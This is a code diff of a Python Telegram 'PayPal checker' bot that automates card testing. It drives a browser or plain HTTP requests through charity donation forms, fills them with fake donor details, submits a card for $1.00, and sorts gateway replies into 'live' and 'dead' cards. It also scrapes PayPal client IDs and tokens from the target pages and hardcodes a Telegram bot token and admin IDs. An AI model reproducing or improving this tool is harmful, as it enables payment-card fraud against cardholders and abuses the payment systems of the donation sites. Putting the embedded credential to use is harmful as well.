@@ -1,17 +1,14 @@
 # ═══════════════════════════════════════════════════════════
-# ⚡ NUCLEAR PAYPAL CHECKER BOT v5.0 - Playwright Edition
+# ⚡ FAST PAYPAL CHECKER BOT v6.0 - Clean & Fast
 # ═══════════════════════════════════════════════════════════
 
 import telebot
 import time
 import threading
 from telebot import types
-import requests, random, json, string, re, base64, os, gc, sys, html
-from datetime import datetime, timedelta
+import requests, random, json, re, base64, os, gc, uuid
 from urllib.parse import urlparse
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import urllib3
-import uuid
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ═══ Playwright ═══
@@ -20,7 +17,7 @@ try:
     HAS_PLAYWRIGHT = True
 except ImportError:
     HAS_PLAYWRIGHT = False
-    print("⚠️ Playwright not installed! Run: pip install playwright && playwright install chromium")
+    print("⚠️ Playwright not installed!")
 
 # ═══ UserAgent ═══
 try:
@@ -35,45 +32,9 @@ except:
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             ]
         def random(self):
             return random.choice(self.agents)
-
-# ═══ Premium Emoji ═══
-PREMIUM_EMOJI_IDS = {
-    "🚀": "5195033767969839232",
-    "💎": "6039601162167000043",
-    "✅": "6034891730526935918",
-    "❌": "6039615816595414817",
-    "⚡": "6037229996622225123",
-    "💰": "4983539296163070766",
-    "🔥": "5424972470023104089",
-    "💳": "5445353829304387411",
-    "📁": "5431200342636300000",
-    "📊": "5431200342636300001",
-    "🔍": "5431200342636300002",
-    "📝": "5431200342636300003",
-    "🔗": "5431200342636300004",
-    "💬": "5431200342636300005",
-    "🏷️": "5431200342636300006",
-    "🔑": "5431200342636300007",
-    "🛠️": "5431200342636300008",
-    "💯": "5431200342636300009",
-    "🚫": "5431200342636300010",
-    "⏱": "5382194935057372936",
-    "🛑": "6039615816595414817",
-}
-
-def premium_emoji(text):
-    if not text:
-        return text
-    result = text
-    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
-        if emoji in result:
-            result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
-    return result
 
 # ═══ Bot Data ═══
 token = '8689698569:AAGRy3j9Ln3YXccd05G5I6Otq95yrz_sP60'
@@ -82,11 +43,7 @@ admin = 6843321125
 admins = ['6843321125']
 OWNER_ID = 6843321125
 
-waiting_users = {}
-reply_mode = {}
 processing_status = {}
-
-error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}
 
 if not os.path.exists('blockusers.txt'):
     with open('blockusers.txt', 'w') as f:
@@ -101,12 +58,13 @@ TEST_CARD_NUMBER = "5104040287872188"
 TEST_CARD_EXPIRY = "20-27-12"
 TEST_CARD_CVC = "951"
 
-# ═══ Error Tracking ═══
+# ═══ Error Counter ═══
+error_counter = {'502': 0, '429': 0, '500': 0, 'timeout': 0, 'connection': 0}
+
 def track_error(error_type):
     if error_type in error_counter:
         error_counter[error_type] += 1
         if error_counter[error_type] > 10:
-            print(f"⚠️ Too many {error_type} errors! Waiting 60s...")
             time.sleep(60)
             error_counter[error_type] = 0
 
@@ -115,10 +73,10 @@ def reset_error_counter():
         error_counter[key] = 0
 
 # ═══ Safe Send Functions ═══
-def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=10):
+def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=5):
     for i in range(retries):
         try:
-            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=premium_emoji(text), parse_mode=parse_mode)
+            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
             reset_error_counter()
             return result
         except Exception as e:
@@ -126,30 +84,21 @@ def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=10):
             if "429" in error_str:
                 track_error('429')
                 try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 15
                 except:
-                    wait_time = 30
-                time.sleep(min(wait_time + 5, 65))
-            elif "502" in error_str or "Bad Gateway" in error_str:
+                    wait_time = 15
+                time.sleep(min(wait_time + 3, 30))
+            elif "502" in error_str:
                 track_error('502')
-                time.sleep(5 * (i + 1))
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                track_error('500')
-                time.sleep(3 * (i + 1))
-            elif "Timed out" in error_str or "timeout" in error_str.lower():
-                track_error('timeout')
-                time.sleep(2 * (i + 1))
-            elif "Connection" in error_str or "ConnectionError" in error_str:
-                track_error('connection')
                 time.sleep(3 * (i + 1))
             else:
                 break
     return None
 
-def safe_send_message(chat_id, text, parse_mode="HTML", retries=10, reply_markup=None):
+def safe_send_message(chat_id, text, parse_mode="HTML", retries=5, reply_markup=None):
     for i in range(retries):
         try:
-            result = bot.send_message(chat_id, premium_emoji(text), parse_mode=parse_mode, reply_markup=reply_markup)
+            result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
             reset_error_counter()
             return result
         except Exception as e:
@@ -157,95 +106,69 @@ def safe_send_message(chat_id, text, parse_mode="HTML", retries=10, reply_markup
             if "429" in error_str:
                 track_error('429')
                 try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
+                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 15
                 except:
-                    wait_time = 30
-                time.sleep(min(wait_time + 5, 65))
-            elif "502" in error_str or "Bad Gateway" in error_str:
+                    wait_time = 15
+                time.sleep(min(wait_time + 3, 30))
+            elif "502" in error_str:
                 track_error('502')
-                time.sleep(5 * (i + 1))
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                track_error('500')
-                time.sleep(3 * (i + 1))
-            elif "Timed out" in error_str or "timeout" in error_str.lower():
-                track_error('timeout')
-                time.sleep(2 * (i + 1))
-            elif "Connection" in error_str or "ConnectionError" in error_str:
-                track_error('connection')
                 time.sleep(3 * (i + 1))
             else:
                 break
     return None
 
-def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=10):
+def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=5):
     for i in range(retries):
         try:
             with open(file_path, 'rb') as f:
-                result = bot.send_document(chat_id, f, caption=premium_emoji(caption), parse_mode=parse_mode)
+                result = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
             reset_error_counter()
             return result
         except Exception as e:
             error_str = str(e)
             if "429" in error_str:
                 track_error('429')
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
-                except:
-                    wait_time = 30
-                time.sleep(min(wait_time + 5, 65))
-            elif "502" in error_str or "Bad Gateway" in error_str:
+                time.sleep(15)
+            elif "502" in error_str:
                 track_error('502')
-                time.sleep(5 * (i + 1))
-            elif "500" in error_str or "Internal Server Error" in error_str:
-                track_error('500')
                 time.sleep(3 * (i + 1))
             else:
                 break
     return None
 
-def safe_get_file(file_id, retries=10):
+def safe_get_file(file_id, retries=5):
     for i in range(retries):
         try:
             return bot.get_file(file_id)
         except Exception as e:
             error_str = str(e)
-            if "502" in error_str or "Bad Gateway" in error_str:
-                time.sleep(5 * (i + 1))
+            if "502" in error_str:
+                time.sleep(3 * (i + 1))
             elif "429" in error_str:
-                wait_time = 30
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
-                except:
-                    pass
-                time.sleep(min(wait_time, 60))
+                time.sleep(15)
             else:
                 break
     return None
 
-def safe_download_file(file_path, retries=10):
+def safe_download_file(file_path, retries=5):
     for i in range(retries):
         try:
             return bot.download_file(file_path)
         except Exception as e:
             error_str = str(e)
-            if "502" in error_str or "Bad Gateway" in error_str:
-                time.sleep(5 * (i + 1))
+            if "502" in error_str:
+                time.sleep(3 * (i + 1))
             elif "429" in error_str:
-                wait_time = 30
-                try:
-                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
-                except:
-                    pass
-                time.sleep(min(wait_time, 60))
+                time.sleep(15)
             else:
                 break
     return None
 
 # ═══════════════════════════════════════════════════════════
-# ═══ LIVE RESPONSES (PayPal + Stripe + NMI + Braintree + API) ═══
+# ═══ LIVE RESPONSES ═══
 # ═══════════════════════════════════════════════════════════
 LIVE_RESPONSES = [
-    # ═══ PayPal Standard ═══
+    # PayPal
     'INSUFFICIENT_FUNDS', 'Payer cannot pay', 'CHARGE 1.0', 'CHARGE 1.00$',
     'RESTRICTED_OR_INACTIVE_ACCOUNT', 'PAYEE_BLOCKED_TRANSACTION',
     'SUSPECTED_FRAUD', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED',
@@ -268,15 +191,12 @@ LIVE_RESPONSES = [
     'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED', 'CVV2_FAILURE_INDICATOR',
     'CARD_EXPIRED', 'INVALID_CARD_NUMBER', 'INVALID_EXPIRATION_DATE',
     'CARD_NOT_SUPPORTED', 'AUTHORIZATION_DENIED', 'AUTHORIZATION_EXPIRED',
-    'AUTHORIZATION_VOIDED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
-    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
-    'TRANSACTION_ALREADY_REFUNDED',
+    'AUTHORIZATION_VOIDED',
     
-    # ═══ Stripe ═══
+    # Stripe
     'Your card has insufficient funds',
     'There was an issue with your donation transaction',
     'Your card was declined',
-    'Your card was declined.',
     'insufficient_funds',
     'card_declined',
     'transaction_not_allowed',
@@ -285,8 +205,6 @@ LIVE_RESPONSES = [
     'Your card\'s expiration date is incorrect',
     'Your card number is incorrect',
     'Your card has expired',
-    'Your card was declined because of insufficient funds',
-    'Your card was declined due to insufficient funds',
     'card_error',
     'expired_card',
     'incorrect_cvc',
@@ -305,15 +223,12 @@ LIVE_RESPONSES = [
     'fraudulent',
     'merchant_blacklist',
     'Please check your payment method',
-    'contact your card issuer for assistance',
     
-    # ═══ NMI ═══
+    # NMI
     'Insufficient Funds',
     'Card Declined',
     'Transaction Declined',
     'nmi_declined',
-    'nmi_insufficient_funds',
-    'Do Not Honor',
     'Invalid Card Number',
     'Invalid CVV',
     'Invalid Expiration',
@@ -330,59 +245,16 @@ LIVE_RESPONSES = [
     'Over Limit',
     'Refer to Card Issuer',
     
-    # ═══ Braintree (Codes) ═══
-    '2000', '2001', '2002', '2003', '2004', '2005', '2006', '2007',
-    '2008', '2009', '2010', '2011', '2012', '2013', '2014', '2015',
-    '2016', '2017', '2018', '2019', '2020', '2021', '2022', '2023',
-    '2024', '2025', '2026', '2027', '2028', '2029', '2030', '2031',
-    '2032', '2033', '2034', '2035', '2036', '2037', '2038', '2039',
-    '2040', '2041', '2042', '2043', '2044', '2045', '2046', '2047',
-    '2048', '2049', '2050', '2051', '2052', '2053', '2054', '2055',
-    '2056', '2057', '2058', '2059', '2060', '2061', '2062', '2063',
-    '2064', '2065', '2066',
+    # Braintree
     'braintree_declined',
+    'Insufficient Funds',
+    'Card Declined',
     
-    # ═══ PayPal API (Direct) ═══
-    'PAYER_CANNOT_PAY',
-    'PAYER_ACTION_REQUIRED',
-    'INSTRUMENT_DECLINED',
-    'TRANSACTION_REFUSED',
-    'PAYMENT_DENIED',
-    'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
-    'PAYER_BLOCKED_TRANSACTION',
-    'PAYER_ACCOUNT_RESTRICTED',
-    'PAYER_ACCOUNT_INVALID',
-    'ORDER_NOT_APPROVED',
-    'PAYEE_BLOCKED_TRANSACTION',
-    'PAYEE_ACCOUNT_RESTRICTED',
-    'PAYEE_ACCOUNT_INVALID',
-    'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
-    'UNSUPPORTED_INTENT',
-    'UNSUPPORTED_PAYMENT_INSTRUMENT',
-    'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
-    'CVV2_FAILURE',
-    'CVV2_FAILURE_INDICATOR',
-    'CARD_EXPIRED',
-    'CARD_TYPE_NOT_SUPPORTED',
-    'INVALID_CARD_NUMBER',
-    'INVALID_EXPIRATION_DATE',
-    'CARD_NOT_SUPPORTED',
-    'INVALID_PAYMENT_METHOD',
-    'DECLINED_DUE_TO_UPDATED_ACCOUNT',
-    'INVALID_OR_RESTRICTED_CARD',
-    'TRANSACTION_LIMIT_EXCEEDED',
-    'AUTHORIZATION_DENIED',
-    'AUTHORIZATION_EXPIRED',
-    'AUTHORIZATION_VOIDED',
-    'CAPTURE_FULLY_REFUNDED',
-    'CAPTURE_PARTIALLY_REFUNDED',
-    'REFUND_NOT_PERMITTED',
-    'REFUND_DENIED',
-    'REFUND_FAILED',
-    'TRANSACTION_ALREADY_REFUNDED',
+    # PayPal API
+    'PAYER_CANNOT_PAY', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
+    'TRANSACTION_REFUSED', 'PAYMENT_DENIED',
 ]
 
-# ═══ DEAD RESPONSES ═══
 DEAD_RESPONSES = [
     'DECLINED', 'Create Order Failed', 'Invalid card format',
     'Error:', 'invalid_client', 'Client Authentication failed',
@@ -390,29 +262,22 @@ DEAD_RESPONSES = [
     'No form fields', 'No au', 'No PayPal data', 'Connection failed',
     'Decode error', 'Invalid URL', 'UserAgent', 'ImportError',
     'Expecting value', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
-    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
     'Playwright not installed', 'Page Load Error', 'Browser Error',
     'INVALID_GATEWAY', 'UNKNOWN_SITE_RESPONSE',
 ]
 
-# ═══ PAYPAL RESPONSES ═══
-PAYPAL_RESPONSES = LIVE_RESPONSES.copy()
-
-# ═══ Playwright Browser Automation Class ═══
+# ═══════════════════════════════════════════════════════════
+# ═══ Playwright Browser Automation ═══
+# ═══════════════════════════════════════════════════════════
 class PayPalBrowserAutomation:
-    """يفتح الموقع، يدور على زر التبرع، يضغطه، يملأ الفورم، يقبل الشروط، يحدد المبلغ، ويدفع"""
-    
     def __init__(self, url, headless=True):
         self.url = url
         self.headless = headless
         self.tokens = {}
         self.html = ""
         self.form_data = {}
-        self.errors = []
-        self.result = None
-        
-        self.first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
-        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
+        self.first_names = ["James", "John", "Robert", "Michael", "William"]
+        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
         self.email = f"{random.choice(self.first_names).lower()}{random.randint(100,999)}@gmail.com"
     
     def get_random_ua(self):
@@ -422,7 +287,6 @@ class PayPalBrowserAutomation:
             return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     
     def run(self, card_number=TEST_CARD_NUMBER, expiry=TEST_CARD_EXPIRY, cvc=TEST_CARD_CVC):
-        """تشغيل الأتمتة كاملة"""
         if not HAS_PLAYWRIGHT:
             return "Playwright not installed"
         
@@ -440,7 +304,6 @@ class PayPalBrowserAutomation:
                 page = context.new_page()
                 page.set_default_timeout(15000)
                 
-                # 1. افتح الصفحة
                 try:
                     page.goto(self.url, timeout=25000, wait_until='domcontentloaded')
                     page.wait_for_timeout(2000)
@@ -448,98 +311,47 @@ class PayPalBrowserAutomation:
                     browser.close()
                     return f"Page Load Error: {str(e)[:80]}"
                 
-                # 2. استخرج التوكنات من الصفحة
                 self.html = page.content()
                 self.extract_tokens()
-                
-                # 3. دور على زر التبرع واضغطه
                 self.find_and_click_donate(page)
                 page.wait_for_timeout(2000)
-                
-                # 4. جيب الـ HTML الجديد
                 self.html = page.content()
                 self.extract_tokens()
-                
-                # 5. املأ الفورم
                 self.fill_form(page)
                 page.wait_for_timeout(1000)
-                
-                # 6. اقبل الشروط
                 self.accept_terms(page)
                 page.wait_for_timeout(500)
-                
-                # 7. حدد المبلغ
                 self.set_amount(page)
                 page.wait_for_timeout(500)
-                
-                # 8. اضغط زر الدفع
                 self.click_pay(page)
-                
-                # 9. استنى النتيجة
                 result = self.wait_for_result(page)
-                
                 browser.close()
-                self.result = result
                 return result
-                
         except Exception as e:
             return f"Browser Error: {str(e)[:100]}"
     
     def extract_tokens(self):
-        """استخراج التوكنات من الصفحة"""
         html = self.html
-        
-        # Client ID - 13 نمط
         client_id_patterns = [
             r'client-id=["\']([^"\']+)["\']',
             r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
             r'data-client-id=["\']([^"\']+)["\']',
             r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
             r'"clientId"\s*:\s*"([^"]+)"',
-            r'client_id\s*=\s*["\']([^"\']+)["\']',
             r'merchant-id=["\']([^"\']+)["\']',
-            r'data-merchant-id=["\']([^"\']+)["\']',
-            r'"merchant_id"\s*:\s*"([^"]+)"',
-            r'data-paypal-client-id=["\']([^"\']+)["\']',
-            r'paypal-client-id=["\']([^"\']+)["\']',
         ]
-        
         for pattern in client_id_patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
                 self.tokens['client_id'] = match.group(1)
                 break
         
-        if 'client_id' not in self.tokens:
-            script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
-            for script in script_matches:
-                for pattern in client_id_patterns:
-                    match = re.search(pattern, script, re.IGNORECASE)
-                    if match:
-                        self.tokens['client_id'] = match.group(1)
-                        break
-                if 'client_id' in self.tokens:
-                    break
-        
-        if 'client_id' not in self.tokens:
-            long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
-            for string in long_strings:
-                if string.startswith(('A', 'B', 'E')):
-                    self.tokens['client_id'] = string
-                    break
-        
-        # Client Token + Access Token
         token_patterns = [
             r'data-client-token=["\']([^"\']+)["\']',
-            r'"data-client-token"\s*:\s*"([^"]+)"',
             r'client-token=["\']([^"\']+)["\']',
             r'client_token=["\']([^"\']+)["\']',
             r'clientToken=["\']([^"\']+)["\']',
-            r'"clientToken"\s*:\s*"([^"]+)"',
         ]
-        
         for pattern in token_patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
@@ -556,47 +368,21 @@ class PayPalBrowserAutomation:
                 self.tokens['client_token'] = enc
                 break
         
-        if 'access_token' not in self.tokens:
-            access_patterns = [
-                r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']',
-                r'"accessToken"\s*:\s*"([^"]+)"',
-                r'access_token["\']?\s*:\s*["\']([^"\']+)["\']',
-                r'accessToken=([^&\s"\']+)',
-            ]
-            for pattern in access_patterns:
-                match = re.search(pattern, html, re.IGNORECASE)
-                if match:
-                    self.tokens['access_token'] = match.group(1)
-                    break
-        
-        # Form Data
         inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
         for name, value in inputs:
             self.form_data[name] = value
         
-        # Ajax URL
         if 'admin-ajax.php' in html:
             self.tokens['ajax_url'] = f'https://{urlparse(self.url).netloc}/wp-admin/admin-ajax.php'
-        elif 'wc-ajax' in html:
-            self.tokens['ajax_url'] = f'https://{urlparse(self.url).netloc}/?wc-ajax=checkout'
     
     def find_and_click_donate(self, page):
-        """دور على زر التبرع واضغطه"""
-        donate_selectors = [
-            'button:has-text("Donate")',
-            'button:has-text("Donate Now")',
-            'button:has-text("Give")',
-            'button:has-text("Give Now")',
-            'button:has-text("Support")',
-            'a:has-text("Donate")',
-            'a:has-text("Donate Now")',
-            '[class*="donate"]',
-            '[id*="donate"]',
-            '[class*="give"]',
-            '.give-btn',
+        selectors = [
+            'button:has-text("Donate")', 'button:has-text("Donate Now")',
+            'button:has-text("Give")', 'button:has-text("Give Now")',
+            'a:has-text("Donate")', 'a:has-text("Donate Now")',
+            '.give-btn', '[class*="donate"]',
         ]
-        
-        for selector in donate_selectors:
+        for selector in selectors:
             try:
                 element = page.locator(selector).first
                 if element.is_visible(timeout=2000):
@@ -608,77 +394,32 @@ class PayPalBrowserAutomation:
         return False
     
     def fill_form(self, page):
-        """ملء الفورم تلقائياً"""
-        # الاسم الأول
-        for selector in ['input[name*="first"]', 'input[id*="first"]', 'input[placeholder*="First"]']:
+        for selector in ['input[name*="first"]', 'input[id*="first"]']:
             try:
                 page.fill(selector, random.choice(self.first_names), timeout=1000)
                 break
             except:
                 continue
-        
-        # الاسم الأخير
-        for selector in ['input[name*="last"]', 'input[id*="last"]', 'input[placeholder*="Last"]']:
+        for selector in ['input[name*="last"]', 'input[id*="last"]']:
             try:
                 page.fill(selector, random.choice(self.last_names), timeout=1000)
                 break
             except:
                 continue
-        
-        # الإيميل
-        for selector in ['input[name*="email"]', 'input[type="email"]', 'input[id*="email"]']:
+        for selector in ['input[name*="email"]', 'input[type="email"]']:
             try:
                 page.fill(selector, self.email, timeout=1000)
                 break
             except:
                 continue
-        
-        # العنوان
-        for selector in ['input[name*="address"]', 'input[id*="address"]', 'input[placeholder*="Address"]']:
-            try:
-                page.fill(selector, '123 Main Street', timeout=1000)
-                break
-            except:
-                continue
-        
-        # المدينة
-        for selector in ['input[name*="city"]', 'input[id*="city"]']:
-            try:
-                page.fill(selector, 'New York', timeout=1000)
-                break
-            except:
-                continue
-        
-        # ZIP
-        for selector in ['input[name*="zip"]', 'input[name*="postal"]', 'input[id*="zip"]']:
-            try:
-                page.fill(selector, '10001', timeout=1000)
-                break
-            except:
-                continue
-        
-        # Phone
-        for selector in ['input[name*="phone"]', 'input[id*="phone"]']:
-            try:
-                page.fill(selector, '2125551234', timeout=1000)
-                break
-            except:
-                continue
     
     def accept_terms(self, page):
-        """قبول الشروط والأحكام"""
-        terms_selectors = [
+        selectors = [
             'input[type="checkbox"][name*="terms"]',
-            'input[type="checkbox"][id*="terms"]',
             'input[type="checkbox"][name*="agree"]',
             'input[type="checkbox"][id*="agree"]',
-            'input[type="checkbox"][name*="tos"]',
-            '.terms input[type="checkbox"]',
-            '.agree input[type="checkbox"]',
-            'label:has-text("agree") input[type="checkbox"]',
         ]
-        
-        for selector in terms_selectors:
+        for selector in selectors:
             try:
                 checkbox = page.locator(selector).first
                 if checkbox.is_visible(timeout=1000):
@@ -689,38 +430,19 @@ class PayPalBrowserAutomation:
                 continue
     
     def set_amount(self, page):
-        """تحديد المبلغ"""
-        amount = "1.00"
-        
-        for selector in ['input[name*="amount"]', 'input[id*="amount"]', 'input[placeholder*="amount"]', 'input[type="number"]']:
+        for selector in ['input[name*="amount"]', 'input[type="number"]']:
             try:
-                page.fill(selector, amount, timeout=1000)
+                page.fill(selector, "1.00", timeout=1000)
                 return
-            except:
-                continue
-        
-        for selector in ['button:has-text("$1")', 'button:has-text("$5")', '[data-amount="1"]', '[data-amount="5"]']:
-            try:
-                button = page.locator(selector).first
-                if button.is_visible(timeout=1000):
-                    button.click()
-                    return
             except:
                 continue
     
     def click_pay(self, page):
-        """اضغط زر الدفع"""
-        pay_selectors = [
-            'button:has-text("Donate")',
-            'button:has-text("Pay")',
-            'button:has-text("Submit")',
-            'button[type="submit"]',
-            'input[type="submit"]',
-            '[class*="paypal-button"]',
-            '.give-submit',
+        selectors = [
+            'button:has-text("Donate")', 'button:has-text("Pay")',
+            'button[type="submit"]', '.give-submit',
         ]
-        
-        for selector in pay_selectors:
+        for selector in selectors:
             try:
                 button = page.locator(selector).first
                 if button.is_visible(timeout=2000):
@@ -731,46 +453,15 @@ class PayPalBrowserAutomation:
                 continue
     
     def wait_for_result(self, page):
-        """استنى الرد من الموقع"""
         try:
-            page.wait_for_timeout(12000)
-            
-            try:
-                text = page.inner_text('body')
-            except:
-                text = ""
-            
-            html = page.content()
-            
-            return self.parse_response(text, html)
-        except Exception as e:
-            return f"Browser Error: {str(e)[:100]}"
+            page.wait_for_timeout(10000)
+            text = page.inner_text('body')
+            return self.parse_response(text)
+        except:
+            return "UNKNOWN_SITE_RESPONSE"
     
-    def parse_response(self, text, html):
-        """استخراج الرد الحقيقي من الموقع"""
+    def parse_response(self, text):
         text_lower = text.lower()
-        html_lower = html.lower()
-        
-        # ابحث في JSON embedded
-        json_patterns = [
-            r'"issue"\s*:\s*"([^"]+)"',
-            r'"name"\s*:\s*"([^"]+)"',
-            r'"error"\s*:\s*"([^"]+)"',
-            r'"message"\s*:\s*"([^"]+)"',
-        ]
-        
-        for pattern in json_patterns:
-            matches = re.findall(pattern, html, re.IGNORECASE)
-            for match in matches:
-                match_upper = match.upper()
-                if any(live.upper() in match_upper for live in LIVE_RESPONSES[:50]):
-                    if 'INSUFFICIENT' in match_upper:
-                        return "INSUFFICIENT_FUNDS"
-                    if 'ORDER_NOT_APPROVED' in match_upper:
-                        return "Payer cannot pay for this transaction."
-                    return match
-        
-        # ابحث في النص المرئي
         for live in LIVE_RESPONSES:
             if live.lower() in text_lower:
                 if 'insufficient' in live.lower():
@@ -778,15 +469,12 @@ class PayPalBrowserAutomation:
                 if 'ORDER_NOT_APPROVED' in live:
                     return "Payer cannot pay for this transaction."
                 return live
-        
         if text.strip():
-            clean_text = ' '.join(text.split())[:200]
-            return f"Site: {clean_text}"
-        
+            return f"Site: {' '.join(text.split())[:200]}"
         return "UNKNOWN_SITE_RESPONSE"
 
 
-# ═══ Request-based Checker (للـ Mass) ═══
+# ═══ Request-based Checker ═══
 class PayPalRequestChecker:
     def __init__(self, target_url):
         self.first_name = ["James", "John", "Robert", "Michael", "William"]
@@ -801,7 +489,6 @@ class PayPalRequestChecker:
         self.form_data = {}
         self.ajax_url = None
         self.cookies = {}
-        self.target_url = target_url
         self.url = urlparse(target_url).netloc
         self.inurl = urlparse(target_url).path
         if urlparse(target_url).query:
@@ -809,8 +496,6 @@ class PayPalRequestChecker:
         self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
         self.html = ""
         self.site_type = "unknown"
-        self.buy_now_url = None
-        self.returned_data = {}
         self._init_and_extract()
         self._try_all_token_methods()
     
@@ -819,7 +504,6 @@ class PayPalRequestChecker:
             headers = {
                 'user-agent': self.uu.random,
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9',
             }
             response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=15)
             self.cookies = dict(response.cookies)
@@ -828,7 +512,6 @@ class PayPalRequestChecker:
             self._extract_form_data(self.html)
             self._extract_ajax_url(self.html)
             self._extract_all_tokens(self.html)
-            self._extract_site_type(self.html)
         except:
             pass
     
@@ -838,34 +521,13 @@ class PayPalRequestChecker:
             r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
             r'data-client-id=["\']([^"\']+)["\']',
             r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
-            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)["\']',
             r'"clientId"\s*:\s*"([^"]+)"',
-            r'client_id\s*=\s*["\']([^"\']+)["\']',
             r'merchant-id=["\']([^"\']+)["\']',
-            r'data-merchant-id=["\']([^"\']+)["\']',
-            r'"merchant_id"\s*:\s*"([^"]+)"',
-            r'data-paypal-client-id=["\']([^"\']+)["\']',
-            r'paypal-client-id=["\']([^"\']+)["\']',
         ]
         for pattern in patterns:
             match = re.search(pattern, html, re.IGNORECASE)
             if match:
                 self.client_id = match.group(1)
-                return
-        
-        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
-        for script in script_matches:
-            for pattern in patterns:
-                match = re.search(pattern, script, re.IGNORECASE)
-                if match:
-                    self.client_id = match.group(1)
-                    return
-        
-        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
-        for string in long_strings:
-            if string.startswith(('A', 'B', 'E')):
-                self.client_id = string
                 return
     
     def _extract_form_data(self, html):
@@ -875,7 +537,7 @@ class PayPalRequestChecker:
         
         data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
         for attr_name, attr_value in data_attrs:
-            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'token', 'order']):
+            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'nonce', 'hash']):
                 self.form_data[attr_name] = attr_value
     
     def _extract_ajax_url(self, html):
@@ -887,11 +549,9 @@ class PayPalRequestChecker:
     def _extract_all_tokens(self, html):
         patterns = [
             r'data-client-token=["\']([^"\']+)["\']',
-            r'"data-client-token"\s*:\s*"([^"]+)"',
             r'client-token=["\']([^"\']+)["\']',
             r'client_token=["\']([^"\']+)["\']',
             r'clientToken=["\']([^"\']+)["\']',
-            r'"clientToken"\s*:\s*"([^"]+)"',
         ]
         for pattern in patterns:
